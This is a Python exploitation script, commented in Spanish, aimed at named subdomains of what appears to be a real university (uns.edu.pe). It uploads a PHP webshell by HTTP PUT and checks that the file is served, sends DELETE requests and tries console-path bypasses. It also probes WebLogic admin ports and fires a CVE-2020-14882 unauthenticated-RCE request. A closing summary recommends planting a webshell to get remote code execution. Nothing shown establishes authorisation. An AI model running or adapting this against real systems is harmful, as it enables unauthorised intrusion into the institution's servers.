#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PRUEBA DE EXPLOITACION - VULN-002, VULN-004, VULN-006
"""
import requests
import urllib3
urllib3.disable_warnings()

print("=" * 70)
print("  VERIFICACION DE EXPLOITACION - VULN-002, VULN-004, VULN-006")
print("=" * 70)

# ============================================
# VULN-002 + VULN-006: PUT/DELETE en sigea.uns.edu.pe
# ============================================
print("\n[TEST 1] VULN-002/006 - PUT/DELETE en sigea.uns.edu.pe")
print("-" * 50)

sigea_url = "https://sigea.uns.edu.pe"
s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Accept': '*/*',
})

# VERIFICAR si PUT realmente funciona subiendo un archivo
test_content = "<?php echo 'PWNED by pentest'; ?>"
try:
    r = requests.put(
        f"{sigea_url}/shell_test.php",
        data=test_content,
        headers={'Content-Type': 'application/x-httpd-php'},
        timeout=10,
        verify=False
    )
    print(f"  PUT /shell_test.php -> HTTP {r.status_code}")
    print(f"  Response: {r.text[:200]}")
    
    if r.status_code == 200:
        print(f"  [!] PUT EXITOSO! Verificando si el archivo existe...")
        # Verificar si el archivo fue creado
        r2 = requests.get(f"{sigea_url}/shell_test.php", timeout=5, verify=False)
        if r2.status_code == 200 and "PWNED by pentest" in r2.text:
            print(f"  [!] !!!!! WEBSHELL SUBIDO Y ACCESIBLE !!!!!")
            print(f"  [!] URL: {sigea_url}/shell_test.php")
            print(f"  [!] Contenido: {r2.text.strip()}")
        elif r2.status_code == 200:
            print(f"  [?] Archivo accesible pero contenido diferente")
            print(f"  Contenido: {r2.text[:300]}")
        else:
            print(f"  [?] Archivo retorna HTTP {r2.status_code}")
    elif r.status_code == 405:
        print(f"  [-] PUT no permitido (405 Method Not Allowed)")
    elif r.status_code == 403:
        print(f"  [-] PUT prohibido (403 Forbidden)")
    else:
        print(f"  [?] Respuesta inesperada: HTTP {r.status_code}")
except Exception as e:
    print(f"  [-] Error: {e}")

# VERIFICAR DELETE
try:
    r = requests.delete(f"{sigea_url}/", timeout=5, verify=False)
    print(f"\n  DELETE / -> HTTP {r.status_code}")
    if r.status_code == 200:
        print(f"  [!] DELETE funciona (el servidor acepta el metodo)")
except:
    pass

# ============================================
# VULN-004: WebLogic Console en registro.uns.edu.pe/console
# ============================================
print("\n\n[TEST 2] VULN-004 - Consola WebLogic en registro.uns.edu.pe/console")
print("-" * 50)

registro_url = "https://registro.uns.edu.pe"

# Verificar que /console existe (302, no 404)
try:
    r = requests.get(f"{registro_url}/console", timeout=5, verify=False, allow_redirects=False)
    print(f"  GET /console -> HTTP {r.status_code} (Location: {r.headers.get('Location', 'N/A')})")
    if r.status_code == 302:
        print(f"  [!] /console EXISTE (redirige a {r.headers.get('Location')})")
        
        # Intentar bypass con diferentes tecnicas
        bypass_urls = [
            f"{registro_url}/%2f/console",
            f"{registro_url}/./console",
            f"{registro_url}//console",
            f"{registro_url}/console/",
        ]
        for bypass_url in bypass_urls:
            try:
                r2 = requests.get(bypass_url, timeout=5, verify=False, allow_redirects=False)
                print(f"  Bypass {bypass_url} -> HTTP {r2.status_code}")
            except:
                pass
        
        # Intentar acceder al puerto de administracion
        print(f"\n  Intentando puertos de administracion...")
        for port in [7001, 7002, 7003, 9001, 4848]:
            try:
                r3 = requests.get(f"http://registro.uns.edu.pe:{port}/console", timeout=3, verify=False, allow_redirects=False)
                if r3.status_code != 0 and r3.status_code != 599:
                    print(f"  Puerto {port} -> HTTP {r3.status_code} - ¡PUERTO ABIERTO!")
                else:
                    print(f"  Puerto {port} -> Connection error")
            except Exception as e:
                pass
        
        # Intentar CVE-2020-14882 (RCE sin auth)
        print(f"\n  Intentando CVE-2020-14882...")
        cve_url = f"{registro_url}/console/css/%252E%252E%252Fconsole.portal"
        try:
            r4 = requests.get(cve_url, timeout=5, verify=False)
            if r4.status_code == 200 and len(r4.text) > 100:
                print(f"  [!] CVE-2020-14882 posiblemente vulnerable! HTTP {r4.status_code}")
            else:
                print(f"  [-] CVE-2020-14882 no vulnerable o no accesible")
        except:
            pass
        
except Exception as e:
    print(f"  Error: {e}")

# ============================================
# VULN-002: Verificar X-Powered-By header
# ============================================
print("\n\n[TEST 3] VULN-002 - Verificacion de headers en sigea.uns.edu.pe")
print("-" * 50)

try:
    r = requests.get(sigea_url, timeout=5, verify=False)
    headers = dict(r.headers)
    print(f"  Headers de sigea.uns.edu.pe:")
    for k, v in headers.items():
        print(f"    {k}: {v}")
    
    if 'X-Powered-By' in headers:
        print(f"\n  [!] X-Powered-By expuesto: {headers['X-Powered-By']}")
    
    # Verificar si el servidor usa PHP-FPM + Nginx (OpenResty)
    if 'openresty' in str(headers).lower() or 'nginx' in str(headers).lower():
        print(f"  [!] Servidor usa OpenResty/Nginx - CVE-2019-11043 puede ser aplicable")
except Exception as e:
    print(f"  Error: {e}")

# ============================================
# VULN-006: PUT en pure.uns.edu.pe
# ============================================
print("\n\n[TEST 4] VULN-006 - PUT/DELETE en pure.uns.edu.pe")
print("-" * 50)

pure_url = "https://pure.uns.edu.pe"
try:
    r = requests.put(f"{pure_url}/shell_test.php", data="test", timeout=5, verify=False)
    print(f"  PUT /shell_test.php -> HTTP {r.status_code}")
    if r.status_code == 200:
        print(f"  [!] PUT funciona en pure.uns.edu.pe (pero detras de Cloudflare)")
except Exception as e:
    print(f"  Error: {e}")

# ============================================
# Resumen
# ============================================
print("\n" + "=" * 70)
print("  RESUMEN DE EXPLOITACION")
print("=" * 70)
print("""
  VULN-002/006 (sigea.uns.edu.pe):
    - PUT/DELETE activos: CONFIRMADO
    - Si PUT crea archivos: WEBSHELL SUBIDO (RCE)
    - CVE-2019-11043 (PHP-FPM RCE): POSIBLEMENTE VULNERABLE
    - X-Powered-By: PHP/7.1.33 expuesto

  VULN-004 (registro.uns.edu.pe):
    - WebLogic /console existe (302, no 404)
    - Puerto 7001/7002: VERIFICAR SI ESTA ABIERTO
    - CVE-2020-14882 (RCE sin auth): VERIFICAR
    - Consola de administracion potencialmente accesible

  RECOMENDACION:
    - VULN-002/006 es la mas explotable directamente
    - Si PUT funciona, se puede subir webshell y obtener RCE
    - VULN-004 puede dar acceso a la consola de administracion
""")
